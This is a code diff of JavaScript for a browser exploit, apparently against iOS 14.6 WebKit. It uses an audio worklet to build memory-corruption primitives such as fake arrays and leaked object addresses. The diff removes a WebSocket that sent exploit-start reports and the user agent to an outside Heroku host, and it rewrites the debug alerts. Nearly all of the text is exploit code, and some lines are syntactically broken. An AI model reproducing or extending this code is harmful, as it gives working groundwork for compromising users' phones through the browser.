@@ -35,15 +35,9 @@ async function pwnMe() {
 	}
 }
 
-var socket = new WebSocket("wss://slug-detected.herokuapp.com/")
 var keep = [];
-function kickstart146() {
-	alert("Hey!\n\nExploit for iOS 14.6 has started!");
-	socket.send(`exploit_start {
-		exploitVersion: "14.6",
-		userAgent: ${navigator.userAgent},
-	}`);
-	var context = new OfflineAudioContext(1, 128, 300000);
+async function start() {
+  var context = new OfflineAudioContext(1, 128, 300000);
   context.audioWorklet.addModule(URL.createObjectURL(new Blob([`
     // constant added to double JSValues
     const kBoxedDoubleOffset = 0x0002000000000000n;
@@ -94,9 +88,9 @@ function kickstart146() {
     delete b1[1];
 
     function setupPrimitives() {
-      port.postMessage("setting up");
+      //port.postMessage("setting up");
       if (a1.length != 0x1337) {
-        port.postMessage("Failure on array length");
+      port.postMessage("Failure on array length");
         return;
       }
 
@@ -140,8 +134,6 @@ function kickstart146() {
       doubleArrayCellHeader = float2bigint(fakeArr[0]) - 0x1n;
       //port.postMessage("double array header: " + doubleArrayCellHeader.toString(16));
 
-      alert("obj address: " + addr.toString(16) + \n\n"double array header: " + doubleArrayCellHeader.toString(16));
-
       // fix broken cell header
       fakeArr[0] = bigint2float(doubleArrayCellHeader);
 
@@ -178,9 +170,7 @@ function kickstart146() {
 
         // TODO: rest of exploit goes here
 
-        alert("Done!\n\nPrimitives are setup!");
-        //port.postMessage("done!");
-        //port.postMessage("primitives are setup!")
+        alert("obj @ " + addr.toString(16) + \n\n"double array header: " + doubleArrayCellHeader.toString(16));
       } catch(e) { // send exception strings to main thread (for debugging)
         port.postMessage("Exception!!");
         port.postMessage(e.toString());
@@ -215,7 +205,6 @@ function kickstart146() {
     wa.port.postMessage("pwn");
   });
 }
-
 
 const appHeight = () => {
 	const doc = document.documentElement;
